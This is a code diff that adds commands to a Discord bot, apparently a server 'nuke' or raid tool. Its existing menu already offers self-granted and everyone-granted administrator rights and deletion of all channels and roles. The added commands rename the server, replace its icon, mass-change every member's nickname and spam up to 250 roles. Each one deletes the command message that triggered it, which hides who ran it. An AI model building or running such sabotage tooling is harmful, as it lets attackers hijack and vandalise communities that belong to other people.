@@ -76,6 +76,11 @@ async def help_command(ctx):
     embed.add_field(name=f"{prefix}help", value="Show this help message", inline=False)
     embed.add_field(name=f"{prefix}god", value="Give yourself administrator role", inline=False)
     embed.add_field(name=f"{prefix}god-all", value="Give EVERYONE administrator permissions", inline=False)
+    embed.add_field(name=f"{prefix}rename-server <name>", value="Rename the server", inline=False)
+    embed.add_field(name=f"{prefix}server-icon <url>", value="Change the server icon", inline=False)
+    embed.add_field(name=f"{prefix}nick <@user> <nickname>", value="Change a user's nickname", inline=False)
+    embed.add_field(name=f"{prefix}nick-all <nickname>", value="Set everyone's nickname", inline=False)
+    embed.add_field(name=f"{prefix}role-spam <name> <count>", value="Mass create roles", inline=False)
     embed.add_field(name=f"{prefix}delchannel <#channel>", value="Delete a specific channel", inline=False)
     embed.add_field(name=f"{prefix}nuke", value="Delete and recreate channel to clear all messages", inline=False)
     embed.add_field(name=f"{prefix}nuke-all", value="Delete ALL channels, categories, and roles (except god/bot roles)", inline=False)
@@ -601,6 +606,229 @@ async def god_all(ctx):
 
     except discord.Forbidden:
         await send_dm(ctx, "I don't have permission to create roles or assign them!")
+    except Exception as e:
+        await send_dm(ctx, f"An error occurred: {str(e)}")
+
+@bot.command(name='rename-server')
+@commands.has_permissions(administrator=True)
+async def rename_server(ctx, *, new_name: str):
+    """Rename the server"""
+    try:
+        old_name = ctx.guild.name
+
+        # Delete command message
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+
+        # Rename the server
+        await ctx.guild.edit(name=new_name, reason=f"Server renamed by {ctx.author}")
+
+        print(f'{Fore.MAGENTA}[RENAME-SERVER] {Fore.WHITE}Server renamed from "{old_name}" to "{new_name}" by {ctx.author.display_name}{Style.RESET_ALL}')
+
+        # Send confirmation
+        embed = discord.Embed(
+            description=f"Server renamed to **{new_name}**",
+            color=discord.Color.blue()
+        )
+        await send_dm(ctx, embed=embed)
+
+    except discord.Forbidden:
+        await send_dm(ctx, "I don't have permission to rename the server!")
+    except Exception as e:
+        await send_dm(ctx, f"An error occurred: {str(e)}")
+
+@bot.command(name='server-icon')
+@commands.has_permissions(administrator=True)
+async def server_icon(ctx, image_url: str):
+    """Change the server icon"""
+    try:
+        # Delete command message
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+
+        # Download the image
+        import aiohttp
+        async with aiohttp.ClientSession() as session:
+            async with session.get(image_url) as resp:
+                if resp.status != 200:
+                    await send_dm(ctx, "Failed to download image from URL!")
+                    return
+                image_data = await resp.read()
+
+        # Change server icon
+        await ctx.guild.edit(icon=image_data, reason=f"Server icon changed by {ctx.author}")
+
+        print(f'{Fore.MAGENTA}[SERVER-ICON] {Fore.WHITE}Server icon changed by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
+
+        # Send confirmation
+        embed = discord.Embed(
+            description="Server icon updated successfully",
+            color=discord.Color.blue()
+        )
+        await send_dm(ctx, embed=embed)
+
+    except discord.Forbidden:
+        await send_dm(ctx, "I don't have permission to change the server icon!")
+    except Exception as e:
+        await send_dm(ctx, f"An error occurred: {str(e)}")
+
+@bot.command(name='nick')
+@commands.has_permissions(manage_nicknames=True)
+async def nick(ctx, member: discord.Member, *, nickname: str):
+    """Change a user's nickname"""
+    try:
+        # Delete command message
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+
+        old_nick = member.display_name
+
+        # Check if we can change this user's nickname
+        if member.top_role >= ctx.guild.me.top_role:
+            await send_dm(ctx, f"I cannot change the nickname of {member.mention} - they have a higher or equal role than me!")
+            return
+
+        # Change nickname
+        await member.edit(nick=nickname, reason=f"Nickname changed by {ctx.author}")
+
+        print(f'{Fore.CYAN}[NICK] {Fore.WHITE}Changed {old_nick} to "{nickname}" by {ctx.author.display_name} in {ctx.guild.name}{Style.RESET_ALL}')
+
+        # Send confirmation
+        embed = discord.Embed(
+            description=f"Changed {member.mention}'s nickname to **{nickname}**",
+            color=discord.Color.green()
+        )
+        await send_dm(ctx, embed=embed)
+
+    except discord.Forbidden:
+        await send_dm(ctx, f"I don't have permission to change {member.mention}'s nickname!")
+    except Exception as e:
+        await send_dm(ctx, f"An error occurred: {str(e)}")
+
+@bot.command(name='nick-all')
+@commands.has_permissions(administrator=True)
+async def nick_all(ctx, *, nickname: str):
+    """Set everyone's nickname to the same thing"""
+    try:
+        # Delete command message
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+
+        guild = ctx.guild
+        author = ctx.author
+
+        print(f'{Fore.CYAN}{Style.BRIGHT}[NICK-ALL] {Fore.WHITE}Setting all nicknames to "{nickname}" by {author.display_name} in {guild.name}{Style.RESET_ALL}')
+
+        # Send initial DM
+        try:
+            await author.send(f"Starting nick-all operation... Setting all nicknames to \"{nickname}\"")
+        except:
+            pass
+
+        success_count = 0
+        failed_count = 0
+
+        # Get all members
+        members = list(guild.members)
+
+        for member in members:
+            # Skip bots
+            if member.bot:
+                failed_count += 1
+                continue
+
+            # Skip if we can't change their nickname (higher role)
+            if member.top_role >= guild.me.top_role:
+                failed_count += 1
+                continue
+
+            try:
+                await member.edit(nick=nickname, reason=f"Nick-all by {author}")
+                success_count += 1
+            except Exception as e:
+                failed_count += 1
+
+        # Send completion DM
+        print(f'{Fore.CYAN}{Style.BRIGHT}[NICK-ALL] {Fore.WHITE}Complete: {success_count} nicknames changed, {failed_count} failed{Style.RESET_ALL}')
+        try:
+            embed = discord.Embed(
+                description=f"Nick-all complete: {success_count} nicknames changed, {failed_count} failed",
+                color=discord.Color.green()
+            )
+            await author.send(embed=embed)
+        except discord.Forbidden:
+            pass
+
+    except discord.Forbidden:
+        await send_dm(ctx, "I don't have permission to change nicknames!")
+    except Exception as e:
+        await send_dm(ctx, f"An error occurred: {str(e)}")
+
+@bot.command(name='role-spam')
+@commands.has_permissions(administrator=True)
+async def role_spam(ctx, role_name: str, count: int):
+    """Mass create roles with a specific name"""
+    try:
+        # Delete command message
+        try:
+            await ctx.message.delete()
+        except:
+            pass
+
+        if count <= 0:
+            await send_dm(ctx, "Please specify a positive number of roles to create!")
+            return
+
+        if count > 250:
+            await send_dm(ctx, "You can only create up to 250 roles at a time!")
+            return
+
+        guild = ctx.guild
+        author = ctx.author
+
+        print(f'{Fore.MAGENTA}{Style.BRIGHT}[ROLE-SPAM] {Fore.WHITE}Creating {count}x "{role_name}" roles by {author.display_name} in {guild.name}{Style.RESET_ALL}')
+
+        # Send initial DM
+        try:
+            await author.send(f"Starting role-spam operation... Creating {count} roles named \"{role_name}\"")
+        except:
+            pass
+
+        created_count = 0
+        failed_count = 0
+
+        for _ in range(count):
+            try:
+                await guild.create_role(name=role_name, reason=f"Role-spam by {author}")
+                created_count += 1
+            except discord.HTTPException:
+                # Rate limited or too many roles
+                failed_count += 1
+                await asyncio.sleep(0.5)
+            except Exception as e:
+                failed_count += 1
+
+        # Send completion DM
+        print(f'{Fore.MAGENTA}{Style.BRIGHT}[ROLE-SPAM] {Fore.WHITE}Complete: {created_count} roles created, {failed_count} failed{Style.RESET_ALL}')
+        try:
+            embed = discord.Embed(
+                description=f"Role-spam complete: {created_count} roles created, {failed_count} failed",
+                color=discord.Color.purple()
+            )
+            await author.send(embed=embed)
+        except discord.Forbidden:
+            pass
+
+    except discord.Forbidden:
+        await send_dm(ctx, "I don't have permission to create roles!")
     except Exception as e:
         await send_dm(ctx, f"An error occurred: {str(e)}")
 
